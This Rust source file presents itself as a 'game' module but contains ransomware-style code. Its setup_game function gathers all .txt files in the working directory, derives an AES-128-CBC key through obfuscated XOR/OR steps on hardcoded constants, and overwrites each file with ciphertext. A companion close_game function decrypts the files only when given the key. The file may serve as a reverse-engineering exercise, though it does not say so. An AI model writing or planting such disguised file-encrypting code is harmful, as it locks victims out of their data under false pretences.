

pub mod game {
    use std::{env, fs, path, io};
    use openssl::symm::{encrypt, decrypt, Cipher};
    use hex::{FromHex};

    pub fn read_line() -> String {
        let mut buffer = String::new();
        io::stdin().read_line(&mut buffer).unwrap();
        let name = buffer.lines().next().expect("Couldn't read input");
        return name.to_string()
    }

    pub fn close_game(provided_key: &str) -> () {
        let setup = || -> Vec<path::PathBuf> {
            let mut pathvec: Vec<path::PathBuf> = Vec::new();
            let cwd = env::current_dir().unwrap_or(path::PathBuf::from("./"));
            for e in path::Path::new(&cwd).read_dir().unwrap() {
                let p: path::PathBuf = e.unwrap().path();
                if let Some(ext) = p.extension() {
                    if ext == "txt" {
                        pathvec.push(p);
                    }
                }
            }
            return pathvec;
        };

        let read_file = |p: &path::PathBuf| -> Result<Vec<u8>, io::Error> {
            let data = fs::read(p)?;
            Ok(data)
        };

        let write_file = |p: path::PathBuf, ct: Vec<u8>| -> Result<(), io::Error> {
            fs::write(p, ct)?;
            Ok(())
        };

        let iv_key: Vec<u8> = Vec::from_hex(provided_key).unwrap();
        let iv: Vec<u8> = iv_key[..16].to_vec();
        let key: Vec<u8> = iv_key[16..].to_vec();
        let cipher = Cipher::aes_128_cbc();

        let paths = setup();
    
        for p in paths {
            let ct = read_file(&p).unwrap();
            let pt = decrypt(cipher, &key, Some(&iv), &ct).unwrap();
            write_file(p, pt).unwrap();
        }
    }

    pub fn setup_game() -> () {
        let setup = || -> Vec<path::PathBuf> {
            let mut pathvec: Vec<path::PathBuf> = Vec::new();
            let cwd = env::current_dir().unwrap_or(path::PathBuf::from("./"));
            for e in path::Path::new(&cwd).read_dir().unwrap() {
                let p: path::PathBuf = e.unwrap().path();
                if let Some(ext) = p.extension() {
                    if ext == "txt" {
                        pathvec.push(p);
                    }
                }
            }
            return pathvec;
        };

        let get_details = || -> (Vec<u8>, Vec<u8>) {
            let mut enc_key = Vec::from_hex("DD331E79588E6A7F0D896417168C0229").unwrap();

            let k1 = Vec::from_hex("46F70F2074F5A738212C9EC747F341B2").unwrap();
            let k2 = Vec::from_hex("095BC22969B29D6C8E98F1D83DAE50D9").unwrap();
            let k3 = Vec::from_hex("2A6FDA77AAF45AED81E87D83D14AB160").unwrap();

            let mut iv = Vec::from_hex("54A48A16BCA56EFC23A2770BDA97E14F").unwrap();

            let do_k1 = |mut k: Vec<u8>, i1: &Vec<u8>| -> Vec<u8> {
                k.iter_mut().zip(i1.iter()).for_each(|(x1, x2)| *x1 ^= *x2);
                return k
            };

            let do_k2 = |mut k: Vec<u8>, i1: &Vec<u8>| -> Vec<u8> {
                k.iter_mut().zip(i1.iter()).for_each(|(x1, x2)| *x1 |= *x2);
                return k
            };

            let do_k3 = |mut k: Vec<u8>, i3: &Vec<u8>| -> Vec<u8> {
                k.iter_mut().zip(i3.iter()).for_each(|(x1, x2)| {
                    if x2 % 2 == 0 {
                        *x1 ^= *x2
                    } 
                });
                return k
            };

            enc_key = do_k1(enc_key, &k1);
            enc_key = do_k2(enc_key, &k2);
            enc_key = do_k3(enc_key, &k3);


            iv = do_k1(iv, &enc_key);
            iv = do_k2(iv, &enc_key);
            iv = do_k3(iv, &enc_key);

            (enc_key, iv)
        };

        let read_file = |p: &path::PathBuf| -> Result<Vec<u8>, io::Error> {
            let data = fs::read(p)?;
            Ok(data)
        };

        let write_file = |p: path::PathBuf, ct: Vec<u8>| -> Result<(), io::Error> {
            fs::write(p, ct)?;
            Ok(())
        };

        let do_the_good_stoof = |paths: Vec<path::PathBuf>, enc_deets: (Vec<u8>, Vec<u8>)| {
            let (key, iv) = enc_deets;
            let cipher = Cipher::aes_128_cbc();
            for p in paths {
                let pt = read_file(&p).unwrap();
                let ct = encrypt(cipher, &key, Some(&iv), &pt).unwrap();
                write_file(p, ct).unwrap();
            }  
        };

        let start = || {
            let paths = setup();
            let enc_deets = get_details();
            do_the_good_stoof(paths, enc_deets);
        };

        start();
    }

    pub struct User {
        name: String,
    }

    impl User {
        pub fn get_name(&self) -> &String {
            return &self.name
        }
    }

    pub fn create_user(name: String) -> User {
        return User { name: name}
    }

}